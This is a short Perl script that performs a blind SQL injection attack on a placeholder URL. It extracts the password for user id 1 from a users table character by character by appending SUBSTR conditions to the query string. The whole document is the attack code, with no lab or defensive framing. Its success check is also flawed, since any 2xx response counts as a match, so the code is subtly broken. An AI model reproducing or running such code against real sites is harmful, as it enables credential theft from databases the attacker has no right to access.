#!/usr/bin/perl

use LWP::UserAgent;

my $url = "http://example.com/vulnerable_page.php?id=1";

# Create a new LWP::UserAgent object
my $ua = LWP::UserAgent->new;

# Set up a loop to iterate through the characters of the password
for (my $i = 1; $i <= 32; $i++) {

  # Set up a loop to iterate through the ASCII values of possible characters
  for (my $j = 32; $j <= 126; $j++) {

    # Set up a new HTTP request to the vulnerable page
    my $request = HTTP::Request->new(GET => $url . " AND SUBSTR((SELECT password FROM users WHERE id=1), $i, 1) = CHAR($j)");

    # Send the request and store the response
    my $response = $ua->request($request);

    # If the response indicates that the query was successful, we have found the correct character
    if ($response->is_success) {
      print chr($j);
      last;
    }
  }
}
